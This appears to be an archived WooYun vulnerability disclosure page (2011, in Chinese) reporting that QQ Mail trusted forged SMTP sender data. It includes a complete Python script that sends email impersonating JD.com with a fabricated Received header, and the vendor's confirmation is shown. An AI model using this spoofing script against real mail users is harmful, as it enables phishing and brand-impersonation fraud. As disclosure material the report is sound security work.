@@ -1,0 +1,386 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		qq邮箱伪造发件地址，容易被钓鱼利用  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		qq邮箱伪造发件地址，容易被钓鱼利用  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/icefish">icefish</a> 
+</li><li>提交时间：		2011-11-22 21:07</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2011-11-22：	细节已通知厂商并且等待厂商处理中<br/>
+									2011-11-23：	厂商已经确认，细节仅向厂商公开<br/>
+									2011-12-03：	细节向核心白帽子及相关领域专家公开<br/>
+									2011-12-13：	细节向普通白帽子公开<br/>
+									2011-12-23：	细节向实习白帽子公开<br/>
+									2011-12-22：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">qq邮箱对某些情况检查不严，逻辑上有所欠缺，容易被钓鱼等利用</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"> qq邮箱对于smtp的检查存在问题，可以自己构建smtp服务器，直接给qq发邮件，其中自己可以伪造任何邮箱（service@qq.com好象不行，但是类似@qq.C0M）这种可以,特别是可以伪造知名企业，团购网站，电子商务网站等。<br />
+<br />
+     其中可以直接利用FastMail1.6（网上可以找到下载），做测试，漏洞就可以得到实现<br />
+<br />
+  </p><pre><code>#coding=utf-8<br />
+&#039;&#039;&#039;<br />
+Created on 2011-11-22<br />
+<br />
+@author: Administrator<br />
+&#039;&#039;&#039;<br />
+# -*- coding: utf-8 -*-<br />
+#coding=utf-8<br />
+import socket<br />
+import select<br />
+import base64<br />
+import os,re<br />
+import time,datetime<br />
+<br />
+class mail:<br />
+    def __init__(self):<br />
+        self.errmsg = &#039;&#039;<br />
+        <br />
+    def send(self, buf):<br />
+        try:<br />
+            byteswritten = 0<br />
+            while byteswritten &lt; len(buf):<br />
+                byteswritten += self.__sockfd.send(buf[byteswritten:])<br />
+        except:<br />
+            pass<br />
+        <br />
+    def recvline(self, strline):<br />
+        detect_fds = [self.__sockfd,]<br />
+        rrdy, wrdy, erdy = select.select(detect_fds, [], [], 20)<br />
+        if len(rrdy) == 0:<br />
+            return False<br />
+        else:<br />
+            while True:<br />
+                try:<br />
+                    strtmp = self.__sockfd.recv(1)<br />
+                    strline[0] += strtmp[0]<br />
+                    if(strtmp[0] == &#039;\n&#039;):<br />
+                        print &#039;server  : &#039;+strline[0]<br />
+                        break<br />
+                except:<br />
+                    return False<br />
+            return True<br />
+    <br />
+    def getresp(self, resp_str):<br />
+        while True:<br />
+            if(self.recvline(resp_str) == False):<br />
+                return False<br />
+            else:<br />
+                if resp_str[0][3] != &#039;-&#039;:<br />
+                    break;<br />
+        return True  <br />
+        <br />
+    def mailhelo(self, hostname):<br />
+        self.send(&#039;helo %s\r\n&#039;%hostname)<br />
+        print &#039;host say: helo %s&#039;%hostname<br />
+        resp_str = [&#039;&#039;,]<br />
+        if(self.getresp(resp_str) == False):<br />
+            return False<br />
+        if resp_str[0][0:3] == &#039;250&#039;:<br />
+            return True<br />
+        else:<br />
+            self.errmsg = resp_str[0]<br />
+            return False<br />
+        <br />
+    def mailfrom(self, fromstr):<br />
+        self.send(&#039;mail from: &lt;%s&gt;\r\n&#039;%fromstr)<br />
+        print &#039;host say: mail from: &lt;%s&gt;&#039;%fromstr<br />
+        resp_str = [&#039;&#039;,]<br />
+        if(self.getresp(resp_str) == False):<br />
+            return False<br />
+        if resp_str[0][0:3] == &#039;250&#039;:<br />
+            return True<br />
+        else:<br />
+            self.errmsg = resp_str[0]<br />
+            return False<br />
+        <br />
+    def mailto(self, tostr):<br />
+        self.send(&#039;rcpt to: &lt;%s&gt;\r\n&#039;%tostr)<br />
+        print &#039;host say: rcpt to: &lt;%s&gt;&#039;%tostr<br />
+        resp_str = [&#039;&#039;,]<br />
+        if(self.getresp(resp_str) == False):<br />
+            return False<br />
+        if resp_str[0][0:3] == &#039;250&#039;:<br />
+            return True<br />
+        else:<br />
+            self.errmsg = resp_str[0]<br />
+            return False<br />
+        <br />
+    def maildata(self):<br />
+        self.send(&#039;data\r\n&#039;)<br />
+        print &#039;host say: data&#039;<br />
+        resp_str = [&#039;&#039;,]<br />
+        if(self.getresp(resp_str) == False):<br />
+            return False<br />
+        if resp_str[0][0:3] == &#039;354&#039;:<br />
+            return True<br />
+        else:<br />
+            self.errmsg = resp_str[0]<br />
+            return False<br />
+        <br />
+    def mailbody(self, bodystr):<br />
+        print &#039;host say: &#039;+&#039;Received: from ICE (unknown [183.60.62.11])\r\n&#039;<br />
+        print&#039;host say: &#039;+&#039;.by 183.60.62.11 (Coremail) with SMTP id _bJCALesoEAeAFMU.1\r\n&#039;<br />
+        print&#039;host say: &#039;+&#039;.for &lt;&#039;+self.To+&#039;&gt;; &#039;+time.strftime(&quot;%a, %d %b %Y %H:%M:%S +0800 (CST)&quot;,time.localtime())+&#039;\r\n&#039;<br />
+        print&#039;host say: &#039;+&#039;X-Originating-IP: [192.168.0.1]\r\n&#039;<br />
+        print&#039;host say: &#039;+&#039;Date: Tue, 22 Nov 2011 16:18:06 +0800\r\n&#039;<br />
+        print&#039;host say: &#039;+&#039;From: &quot;=?GB2312?B?zfU=?=&quot; &lt;&#039;+self.From+&#039;&gt;\r\n&#039;<br />
+        print&#039;host say: &#039;+&#039;Subject:&#039;+self.Subject+&#039;?=\r\n&#039;<br />
+        print&#039;host say: &#039;+&#039;To: &lt;&#039;+self.To+&#039;&gt;\r\n&#039;<br />
+        print&#039;host say: &#039;+&#039;X-Priority: 1\r\n&#039;<br />
+        print&#039;host say: &#039;+&#039;X-mailer: iceMail 1.0 [cn]\r\n&#039;<br />
+        print&#039;host say: &#039;+&#039;Mime-Version: 1.0\r\n&#039;<br />
+        print&#039;host say: &#039;+&#039;Content-Type: text/plain;\r\n&#039;<br />
+        print&#039;host say: &#039;+&#039;.charset=&quot;GB2312&quot;\r\n&#039;<br />
+        print&#039;host say: &#039;+&#039;Content-Transfer-Encoding: quoted-printable\r\n\r\n&#039;<br />
+        print &#039;host say: &#039;+bodystr<br />
+        <br />
+        self.send(&#039;Received: from ICE (unknown [8.8.8.8])\r\n&#039;)<br />
+        self.send(&#039;.by 8.8.8.8 (Coremail) with SMTP id _bJCALesoEAeAFMU.1\r\n&#039;)<br />
+        self.send(&#039;.for &lt;&#039;+self.To+&#039;&gt;; &#039;+time.strftime(&quot;%a, %d %b %Y %H:%M:%S +0800 (CST)&quot;,time.localtime())+&#039;\r\n&#039;)<br />
+        self.send(&#039;X-Originating-IP: [8.8.8.8]\r\n&#039;)<br />
+        self.send(&#039;Date: &#039;+time.strftime(&quot;%a, %d %b %Y %H:%M:%S +0800&quot;,time.localtime())+&#039;\r\n&#039;)<br />
+        self.send(&#039;From: &#039;+self.FromName+ &#039;&lt;&#039;+self.From+&#039;&gt;\r\n&#039;)<br />
+        self.send(&#039;Subject: &#039;+self.Subject+&#039;\r\n&#039;)<br />
+        self.send(&#039;To: &lt;&#039;+self.To+&#039;&gt;\r\n&#039;)<br />
+        self.send(&#039;X-Priority: 1\r\n&#039;)<br />
+        self.send(&#039;X-mailer: iceMail 1.0 [cn]\r\n&#039;)<br />
+        self.send(&#039;Mime-Version: 1.0\r\n&#039;)<br />
+        self.send(&#039;Content-Type: text/plain;\r\n&#039;)<br />
+        self.send(&#039;.charset=&quot;GB2312&quot;\r\n&#039;)<br />
+        self.send(&#039;Content-Transfer-Encoding: quoted-printable\r\n\r\n&#039;)<br />
+        self.send(bodystr)       <br />
+        self.send(&#039;\r\n.\r\n&#039;)<br />
+        resp_str = [&#039;&#039;,]<br />
+        if(self.getresp(resp_str) == False):<br />
+            return False<br />
+        if resp_str[0][0:3] == &#039;250&#039;:<br />
+            return True<br />
+        else:<br />
+            self.errmsg = resp_str[0]<br />
+            return False<br />
+        <br />
+    def mailquit(self):<br />
+        self.send(&#039;quit\r\n&#039;)<br />
+        print &#039;host say: quit&#039;<br />
+        resp_str = [&#039;&#039;,]<br />
+        if(self.getresp(resp_str) == False):<br />
+            return False<br />
+        if resp_str[0][0:3] == &#039;221&#039;:<br />
+            print &#039;server  : Bye&#039;<br />
+            print &#039;mail send ok&#039;<br />
+            return True<br />
+        else:<br />
+            self.errmsg = resp_str[0]<br />
+            return False<br />
+        <br />
+    def txmail(self, hostname, mailfrom, rcptto, bodystr):<br />
+        mx_server_list = []<br />
+        mail_postfix = re.split(&#039;@&#039;,rcptto)<br />
+        #print mail_postfix<br />
+        try:<br />
+            outstr = os.popen(&#039;nslookup -type=mx -timeout=10 %s&#039;%mail_postfix[1], &#039;r&#039;).read()<br />
+        except Exception, e:<br />
+            print &#039;DEBUG: Execute nslookup:&#039;,e<br />
+            return False<br />
+        <br />
+        linestr = re.split(&#039;\n&#039;, outstr)<br />
+        for s in linestr:<br />
+            if re.match(&#039;.+[ |\t]mail exchanger[ |\t].+&#039;, s) != None:<br />
+                c = re.split(&#039; |\t&#039;, s)<br />
+                mx_server_list.append(c[len(c) - 1])<br />
+<br />
+        if len(mx_server_list) == 0:<br />
+            self.errmsg = &#039;Can not find MX server&#039;<br />
+            return False<br />
+        <br />
+        for mx_element in mx_server_list:<br />
+            return_val = True<br />
+            mx_server_ip = socket.gethostbyname(mx_element)<br />
+            tx_sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)<br />
+            try:<br />
+                tx_sockfd.connect((mx_server_ip, 25))<br />
+                self.__sockfd = tx_sockfd<br />
+                resp_str = [&#039;&#039;,]<br />
+                self.getresp(resp_str)<br />
+                if self.mailhelo(hostname) and self.mailfrom(mailfrom) \<br />
+                   and self.mailto(rcptto) and self.maildata() and self.mailbody(bodystr) and self.mailquit():<br />
+                    pass<br />
+                else:<br />
+                    return_val = False<br />
+            except Exception, e:<br />
+                return_val = False<br />
+            try:    <br />
+                tx_sockfd.close()<br />
+            except:<br />
+                pass<br />
+            <br />
+            if return_val == True:<br />
+                break<br />
+            <br />
+        return return_val<br />
+    def sendMail(self):<br />
+        self.StmpHost=self.From.split(&quot;@&quot;)[1]<br />
+        self.txmail(self.StmpHost, self.From, self.To, self.Data)<br />
+<br />
+   <br />
+if __name__ == &#039;__main__&#039;:<br />
+    icemail=mail()<br />
+    icemail.Port=25<br />
+    icemail.To=&#039;11111@qq.com&#039;<br />
+    icemail.From=&#039;newsletter2@360buy.com&#039;<br />
+    icemail.FromName=&quot;京东网上商城 &quot;<br />
+    icemail.Subject=&quot;得力办公文具全场每满100减30元，买鼠标即可得鼠标垫！(AD)&quot;<br />
+    icemail.Data=&#039;我是假的&#039;<br />
+    icemail.sendMail()</code></pre><p class='detail'><br />
+<br />
+这个是我拿python写的一个smtp的服务器简易实现，可以看出qq服务器是直接信任smtp服务器所告诉的一切信息 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/222103102769b89e5d4efd7aa01a71d8a3ae0ad7.jpg" target="_blank"><img src="../images/222103102769b89e5d4efd7aa01a71d8a3ae0ad7.jpg" alt="" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/22210324bde902ef117d9bf5f6e9dd2b801a5d10.jpg" target="_blank"><img src="../images/22210324bde902ef117d9bf5f6e9dd2b801a5d10.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+因为我做的测试太多了，导致了邮件被归类成了垃圾邮件，本身方法是没有问题的，开始的几份邮件都在收件箱中，而且明显可以看到自定义标签已经把他归类为shop类 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">在对google和163做类似测试的时候都失败了，google似乎检测了smtp的ip是否在列表中，163失败原因不详，但是估计也是做了修正，qq这个要快点修复啊。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/icefish" title="icefish">icefish</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-03388" title="qq邮箱伪造发件地址，容易被钓鱼利用">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：12 </p>
+													<p class="detail">确认时间：2011-11-23 09:27</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢啊</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="3388";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
